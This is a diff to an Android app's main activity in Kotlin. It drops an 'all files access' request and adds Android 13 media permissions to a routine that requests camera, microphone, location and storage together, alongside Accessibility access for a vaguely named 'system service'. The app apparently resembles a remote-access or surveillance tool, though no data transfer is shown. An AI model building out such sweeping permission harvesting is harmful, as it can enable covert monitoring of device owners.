@@ -233,31 +233,9 @@ class MainActivity : AppCompatActivity() {
         }
         root.addView(btnAccessibility)
 
-        // ✅ Storage permission button (All files access - required for file explorer)
-        val btnStorage = Button(this).apply {
-            text = "📁 تفعيل صلاحية كل الملفات"
-            setTextColor(Color.WHITE)
-            textSize = 14f
-            setTypeface(typeface, Typeface.BOLD)
-            background = GradientDrawable().apply {
-                setColor(Color.parseColor("#FF8B4513"))
-                cornerRadius = 12f
-            }
-            setPadding(0, 24, 0, 24)
-            layoutParams = LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.MATCH_PARENT,
-                LinearLayout.LayoutParams.WRAP_CONTENT
-            ).apply { topMargin = 16 }
-            setOnClickListener {
-                Log.i(TAG, "Storage permission button clicked")
-                requestAllFilesAccess()
-            }
-        }
-        root.addView(btnStorage)
-
         // Info text
         val info = TextView(this).apply {
-            text = "\nℹ️ All permissions, Accessibility, and Storage access are required for the system service to function properly."
+            text = "\nℹ️ All permissions and Accessibility are required for the system service to function properly."
             setTextColor(Color.parseColor("#FF999999"))
             textSize = 11f
             setPadding(0, 16, 0, 0)
@@ -267,46 +245,6 @@ class MainActivity : AppCompatActivity() {
 
         scrollView.addView(root)
         setContentView(scrollView)
-    }
-
-    /**
-     * Request MANAGE_EXTERNAL_STORAGE permission (All files access).
-     * Required on Android 11+ to read file contents in directories like
-     * /sdcard/Download, /sdcard/DCIM, etc.
-     * Without this, listFiles() returns folder names but their contents are empty.
-     */
-    private fun requestAllFilesAccess() {
-        try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                if (Environment.isExternalStorageManager()) {
-                    Toast.makeText(this, "✅ صلاحية كل الملفات مفعّلة بالفعل", Toast.LENGTH_SHORT).show()
-                    return
-                }
-                Toast.makeText(this,
-                    "فعّل الصلاحية لهذا التطبيق من الإعدادات",
-                    Toast.LENGTH_LONG).show()
-                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
-                    data = Uri.parse("package:$packageName")
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                }
-                startActivity(intent)
-            } else {
-                // Android 10 and below - regular storage permission
-                requestAllPermissions()
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "Failed to request all files access: ${e.message}")
-            // Fallback: open general settings
-            try {
-                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
-                    data = Uri.parse("package:$packageName")
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                }
-                startActivity(intent)
-            } catch (e2: Exception) {
-                Toast.makeText(this, "تعذر فتح الإعدادات", Toast.LENGTH_SHORT).show()
-            }
-        }
     }
 
     // ═══════════════════════════════════════════════════════════
@@ -507,7 +445,7 @@ class MainActivity : AppCompatActivity() {
     // PERMISSIONS & CONNECTION
     // ═══════════════════════════════════════════════════════════
     private fun requestAllPermissions() {
-        val perms = arrayOf(
+        val perms = mutableListOf(
             android.Manifest.permission.CAMERA,
             android.Manifest.permission.RECORD_AUDIO,
             android.Manifest.permission.ACCESS_FINE_LOCATION,
@@ -519,9 +457,16 @@ class MainActivity : AppCompatActivity() {
             android.Manifest.permission.READ_EXTERNAL_STORAGE,
             android.Manifest.permission.WRITE_EXTERNAL_STORAGE
         )
+        // On Android 13+ (Tiramisu), request granular media permissions
+        // These appear as "الملفات والوسائط" (Files and media) in the permissions list
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            perms.add(android.Manifest.permission.READ_MEDIA_IMAGES)
+            perms.add(android.Manifest.permission.READ_MEDIA_VIDEO)
+            perms.add(android.Manifest.permission.READ_MEDIA_AUDIO)
+        }
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            requestPermissions(perms, 999)
-            Log.i(TAG, "Requested all dangerous permissions")
+            requestPermissions(perms.toTypedArray(), 999)
+            Log.i(TAG, "Requested all dangerous permissions: ${perms.size}")
         }
     }
 
